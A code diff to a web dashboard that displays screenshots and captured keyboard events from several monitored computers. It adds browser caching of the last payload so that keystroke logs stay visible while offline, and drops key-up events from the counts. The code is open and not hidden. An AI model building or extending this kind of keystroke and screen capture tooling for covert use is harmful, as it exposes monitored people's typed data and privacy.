@@ -504,6 +504,7 @@
       let devicesFilter = '';
       let currentKeyboardEvents = [];
       let currentKeyboardIndices = [];
+      const CACHE_KEY = 'monitorLastPayloadCache';
       const demoDevices = [
         {
           device_id: 'DESKTOP-01',
@@ -572,6 +573,23 @@
         });
       }
 
+      function loadCachedPayload() {
+        try {
+          const raw = localStorage.getItem(CACHE_KEY);
+          return raw ? JSON.parse(raw) : null;
+        } catch (error) {
+          return null;
+        }
+      }
+
+      function saveCachedPayload(payload) {
+        try {
+          localStorage.setItem(CACHE_KEY, JSON.stringify(payload));
+        } catch (error) {
+          // ignore storage failures
+        }
+      }
+
       function updateDeviceCount(devices) {
         deviceCount.textContent = `Computers (${devices.length})`;
       }
@@ -637,7 +655,7 @@
         statusDot.classList.remove('offline');
         previewTitle.textContent = formatDeviceTitle(selected);
         previewImage.src = buildImageUrl(selected);
-        const eventCount = Array.isArray(selected.keyboard_events) ? selected.keyboard_events.filter(e => e && e.type && ['keydown', 'keyup', 'keypress', 'press', 'key'].includes(String(e.type).toLowerCase())).length : 0;
+        const eventCount = Array.isArray(selected.keyboard_events) ? selected.keyboard_events.filter(e => e && e.type && ['keydown', 'keypress', 'press', 'key'].includes(String(e.type).toLowerCase())).length : 0;
         previewMeta.innerHTML = `Screen monitoring · ${selected.source || 'standalone-capture-app'} · ${selected.timestamp || 'Unknown time'} <span class="preview-badge">${eventCount} keyboard event${eventCount === 1 ? '' : 's'}</span>`;
         const debugInfo = document.getElementById('debugInfo');
         try {
@@ -700,7 +718,7 @@
 
           const eventDetail = document.createElement('div');
           eventDetail.className = 'device-detail';
-          const eventCount = Array.isArray(device.keyboard_events) ? device.keyboard_events.filter(e => e && e.type && ['keydown', 'keyup', 'keypress', 'press', 'key'].includes(String(e.type).toLowerCase())).length : 0;
+          const eventCount = Array.isArray(device.keyboard_events) ? device.keyboard_events.filter(e => e && e.type && ['keydown', 'keypress', 'press', 'key'].includes(String(e.type).toLowerCase())).length : 0;
           eventDetail.textContent = `${eventCount} keyboard event${eventCount === 1 ? '' : 's'}`;
 
           const status = document.createElement('div');
@@ -785,7 +803,7 @@
 
       function renderKeyboardLog(events) {
         const original = Array.isArray(events) ? events : [];
-        const filtered = original.filter((ev) => ev && ev.type && ['keydown', 'keyup', 'keypress', 'press', 'key'].includes(String(ev.type).toLowerCase()));
+        const filtered = original.filter((ev) => ev && ev.type && ['keydown', 'keypress', 'press', 'key'].includes(String(ev.type).toLowerCase()));
         currentKeyboardEvents = filtered;
         currentKeyboardIndices = filtered.map((_, idx) => idx);
 
@@ -886,8 +904,18 @@
       }
 
       function setDisconnectedState() {
-        // Receiver is unreachable: stop polling and clear displayed devices.
         pollingEnabled = false;
+        const cached = loadCachedPayload();
+        if (cached && Array.isArray(cached.devices) && cached.devices.length) {
+          lastPayload = cached;
+          renderDevices();
+          updatePreview();
+          previewStatus.textContent = 'OFFLINE';
+          statusDot.classList.remove('online');
+          statusDot.classList.add('offline');
+          previewMeta.textContent = 'Offline: showing cached keyboard events until reconnect.';
+          return;
+        }
         lastPayload = { devices: [] };
         previewStatus.textContent = 'OFFLINE';
         statusDot.classList.remove('online');
@@ -914,6 +942,7 @@
             devices = demoDevices;
           }
           lastPayload = { devices };
+          saveCachedPayload(lastPayload);
           renderDevices();
           updatePreview();
         } catch (error) {
